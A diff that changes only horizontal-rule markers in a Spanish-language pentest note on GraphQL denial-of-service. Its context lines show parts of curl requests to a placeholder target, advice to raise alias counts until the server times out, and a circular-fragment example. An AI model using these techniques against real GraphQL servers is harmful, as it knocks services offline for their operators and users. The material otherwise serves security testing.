@@ -18,7 +18,7 @@ linked:
 ---
 # GraphQL - DoS
 
-***
+---
 
 ## Deeply Nested Queries (Recursión)
 
@@ -48,7 +48,7 @@ curl -X POST -H "Content-Type: application/json" \
   https://target/graphql
 ```
 
-___
+---
 
 ## Aliases Overloading
 
@@ -78,7 +78,7 @@ curl -X POST -H "Content-Type: application/json" \
 # Ajustar N: empezar 100, 1000, 10000 hasta que server timeout
 ```
 
-___
+---
 
 ## Field Duplication / Batching Abuse
 
@@ -105,7 +105,7 @@ BATCH+=']'
 curl -X POST -H "Content-Type: application/json" -d "$BATCH" https://target/graphql
 ```
 
-___
+---
 
 ## Circular Fragments
 
@@ -137,4 +137,4 @@ fragment B on User {
 
 Engine viejo intenta expandir A → expand B → expand A → loop. Apps modernas detectan y rejectan.
 
-***
+---
